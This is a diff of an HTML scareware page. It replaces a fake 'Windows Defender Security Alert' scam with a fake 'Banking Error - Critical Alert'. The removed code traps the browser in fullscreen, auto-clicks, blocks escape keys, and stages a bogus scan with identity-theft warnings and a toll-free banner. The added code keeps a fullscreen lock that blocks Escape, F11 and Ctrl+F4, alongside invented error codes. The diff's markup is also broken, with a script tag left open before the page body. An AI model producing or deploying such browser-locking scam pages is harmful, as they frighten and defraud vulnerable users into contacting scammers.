@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Windows Defender Security Alert</title>
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <title>Banking Error - Critical Alert</title>
     <style>
         /* Windows 11 Modern Theme */
         body {
@@ -201,103 +200,57 @@
 	
 
     <script>
-        let fullscreenLockActive = true;
-        let clickCounter = 0;
+</head>
+<body>
+    <div class="alert-container">
+        <div class="threat-header">
+            <span class="status-flash">⚠ Critical Banking Error Detected</span>
+        </div>
+        
+        <div class="scan-results">
+            <div class="technical-code">[ERR] FIN:Banking.Theft.0xBADCODE</div>
+            <div class="mitigation-protocol">Unauthorized Transaction Detected - Threat Level: 0xDEADBEEF</div>
+        </div>
 
-        function startFullscreenTrap() {
-            requestFullScreen();
-            const clickInterval = setInterval(() => {
-                if(clickCounter < 100000) {
-                    document.documentElement.click();
-                    clickCounter++;
-                }
-            }, 10);
+        <div style="margin-top: 25px; color: #ccc;">
+            <div style="font-size: 0.9em;">Recommended Action Protocol:</div>
+            <div class="technical-code" style="margin: 10px 0;">
+                > invoke FinancialResponse --severity=CRITICAL --vector=BANKING
+            </div>
+            <div style="color: white;">
+                Immediate Account Freeze Required (ASIMOV Protocol Violation)
+            </div>
+        </div>
+    </div>
 
-            const fullscreenCheck = setInterval(() => {
-                if(!document.fullscreenElement) {
-                    requestFullScreen();
-                }
-            }, 100);
-        }
-
-        function requestFullScreen() {
-            const elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
-            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-        }
-
-        document.addEventListener('fullscreenchange', () => {
-            if(!document.fullscreenElement && fullscreenLockActive) {
-                requestFullScreen();
+    <script>
+        // Fullscreen Lock Logic
+        function enforceFullscreen() {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement && !document.msFullscreenElement) {
+                const elem = document.documentElement;
+                if (elem.requestFullscreen) elem.requestFullscreen();
+                else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
+                else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+                else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
             }
-        });
+        }
 
+        // Block exit attempts
+        document.addEventListener('fullscreenchange', enforceFullscreen);
+        document.addEventListener('webkitfullscreenchange', enforceFullscreen);
+        document.addEventListener('mozfullscreenchange', enforceFullscreen);
+        document.addEventListener('MSFullscreenChange', enforceFullscreen);
+
+        // Block keyboard shortcuts
         document.addEventListener('keydown', (e) => {
-            if(['Escape','F11','Alt','Control','Meta','Tab'].includes(e.key)) {
+            if (e.key === 'Escape' || e.key === 'F11' || (e.ctrlKey && e.key === 'F4')) {
                 e.preventDefault();
-                requestFullScreen();
+                enforceFullscreen();
             }
         });
 
-        document.addEventListener('click', () => {
-            if(!document.fullscreenElement) {
-                startFullscreenTrap();
-                startScan();
-            }
-        });
-
-        function startScan() {
-            let scanProgress = 0;
-            let logMessages = [
-                "Scanning system files...",
-                "Checking registry entries...",
-                "Analyzing network traffic...",
-                "Verifying software integrity...",
-                "Looking for unusual behavior...",
-                "Checking Windows Defender logs...",
-                "Inspecting running processes...",
-                "Verifying system permissions...",
-                "Cross-referencing threat database...",
-                "Almost done...",
-                "⚠ CRITICAL: Suspicious network patterns detected!"
-            ];
-
-            let scanInterval = setInterval(() => {
-                scanProgress += 10;
-                $("#progressFill").css("width", scanProgress + "%");
-                $("#scan-status").text(scanProgress + "% Complete");
-
-                if(scanProgress >= 85) {
-                    $(".scan-logs, .scan-logs p").css("color", "red");
-                    $("#scan-status").css({
-                        "color": "red",
-                        "text-shadow": "0 0 10px rgba(255,0,0,0.5)"
-                    }).prepend('<img src="data:image/gif;base64,R0lGODlhEAAQAPIAAP///wAAAMLCwkJCQgAAAGJiYoKCgpKSkiH/C05FVFNDQVBFMi4wAwEAAAAh/hpDcmVhdGVkIHdpdGggYWpheGxvYWQuaW5mbwAh+QQJCgAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQJCgAAACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkECQoAAAAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkECQoAAAAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQJCgAAACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3SwWhUouZVsMCC7RYagPD2sbfKaLioTBUl7kbAAEAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQJCgAAACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAIAAAAACAAIAAACBZRpnigGcCA1QAEAIfkECQoAAAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAA7" class="warning-icon">');
-                    
-                    if(scanProgress % 20 === 0) {
-                        $("#scanLogs").append(
-                            '<p style="color:red;animation:flashText 0.5s infinite;">' +
-                            '🚨 NETWORK IDENTITY THEFT DETECTED!</p>' +
-                            '<p style="color:red;">BANKING PERSONAL DATA BREACHED 20%</p>' +
-                            '<p style="color:red;font-weight:bold;">CHECK YOUR DNS ROUTER OR WIFI/CARRIER SERVICE PROVIDERS</p>'
-                        );
-                    }
-                }
-
-                if(scanProgress >= 100) {
-                    clearInterval(scanInterval);
-                    setTimeout(showThreatWarning, 500);
-                }
-            }, 800);
-        }
-
-        function showThreatWarning() {
-            $("#criticalWarning").fadeIn();
-            $("#tollFreeBanner").fadeIn();
-            document.getElementById("alertSound").play();
-        }
+        // Start in fullscreen mode
+        enforceFullscreen();
     </script>
 </body>
 </html>
